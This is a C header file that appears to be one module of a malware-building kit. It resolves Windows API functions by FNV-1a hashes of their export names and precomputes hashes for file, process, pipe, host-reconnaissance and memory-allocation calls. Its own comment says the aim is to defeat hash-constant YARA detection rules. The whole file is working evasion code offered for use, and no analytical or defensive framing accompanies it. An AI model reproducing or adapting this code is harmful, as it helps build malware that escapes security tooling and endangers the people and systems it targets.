// chunk: api_resolve/api_hash_fnv1a
// depends: (none)
// provides: fnv1a_hash, resolve_api, RESOLVED_APIS
// headers: windows.h
// note: FNV-1a hash-based API resolution — different hash constants from DJB2/CRC32, defeats hash-constant YARA rules

#ifndef CHUNK_API_HASH_FNV1A
#define CHUNK_API_HASH_FNV1A

#include <windows.h>

static DWORD fnv1a_hash(const char *str) {
    DWORD h = 0x811C9DC5u;
    while (*str) {
        h ^= (BYTE)*str++;
        h *= 0x01000193u;
    }
    return h;
}

static FARPROC resolve_api(HMODULE mod, DWORD hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (fnv1a_hash(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

static struct {
    fn_CreateFileA      pCreateFileA;
    fn_ReadFile         pReadFile;
    fn_WriteFile        pWriteFile;
    fn_CloseHandle      pCloseHandle;
    fn_CreateProcessA   pCreateProcessA;
    fn_CopyFileA        pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA      pDeleteFileA;
    fn_CreatePipe       pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize      pGetFileSize;
    fn_GetTempPathA     pGetTempPathA;
    fn_GetComputerNameA pGetComputerNameA;
    fn_GetUserNameA     pGetUserNameA;
    fn_Sleep            pSleep;
    fn_GetTickCount     pGetTickCount;
    fn_VirtualAlloc     pVirtualAlloc;
} RESOLVED_APIS = {0};

// Pre-computed FNV-1a hashes
#define H_CreateFileA        0xBDCAC9CEu
#define H_ReadFile           0x54FCC943u
#define H_WriteFile          0x7F07C44Au
#define H_CloseHandle        0xFABA0065u
#define H_CreateProcessA     0x4A7C0A09u
#define H_CopyFileA          0x706946A9u
#define H_GetFileAttributesA 0xDA1A7563u
#define H_DeleteFileA        0x82417177u
#define H_CreatePipe         0x760DC161u
#define H_WaitForSingleObject 0x71948CA4u
#define H_GetFileSize        0x44ED8118u
#define H_GetTempPathA       0x5F59CFF1u
#define H_GetComputerNameA   0x446EAA3Cu
#define H_GetUserNameA       0x38A7C61Au
#define H_Sleep              0x2FA62CA8u
#define H_GetTickCount       0x0F4D8B55u
#define H_VirtualAlloc       0x03285501u

static int resolve_all_apis(void) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE adv = GetModuleHandleA("advapi32.dll");
    if (!k32) return 0;

    RESOLVED_APIS.pCreateFileA = (fn_CreateFileA)resolve_api(k32, H_CreateFileA);
    RESOLVED_APIS.pReadFile = (fn_ReadFile)resolve_api(k32, H_ReadFile);
    RESOLVED_APIS.pWriteFile = (fn_WriteFile)resolve_api(k32, H_WriteFile);
    RESOLVED_APIS.pCloseHandle = (fn_CloseHandle)resolve_api(k32, H_CloseHandle);
    RESOLVED_APIS.pCreateProcessA = (fn_CreateProcessA)resolve_api(k32, H_CreateProcessA);
    RESOLVED_APIS.pCopyFileA = (fn_CopyFileA)resolve_api(k32, H_CopyFileA);
    RESOLVED_APIS.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(k32, H_GetFileAttributesA);
    RESOLVED_APIS.pDeleteFileA = (fn_DeleteFileA)resolve_api(k32, H_DeleteFileA);
    RESOLVED_APIS.pCreatePipe = (fn_CreatePipe)resolve_api(k32, H_CreatePipe);
    RESOLVED_APIS.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(k32, H_WaitForSingleObject);
    RESOLVED_APIS.pGetFileSize = (fn_GetFileSize)resolve_api(k32, H_GetFileSize);
    RESOLVED_APIS.pGetTempPathA = (fn_GetTempPathA)resolve_api(k32, H_GetTempPathA);
    RESOLVED_APIS.pGetComputerNameA = (fn_GetComputerNameA)resolve_api(k32, H_GetComputerNameA);
    RESOLVED_APIS.pSleep = (fn_Sleep)resolve_api(k32, H_Sleep);
    RESOLVED_APIS.pGetTickCount = (fn_GetTickCount)resolve_api(k32, H_GetTickCount);
    RESOLVED_APIS.pVirtualAlloc = (fn_VirtualAlloc)resolve_api(k32, H_VirtualAlloc);

    if (adv)
        RESOLVED_APIS.pGetUserNameA = (fn_GetUserNameA)resolve_api(adv, H_GetUserNameA);

    return (RESOLVED_APIS.pCreateFileA != NULL);
}

#endif
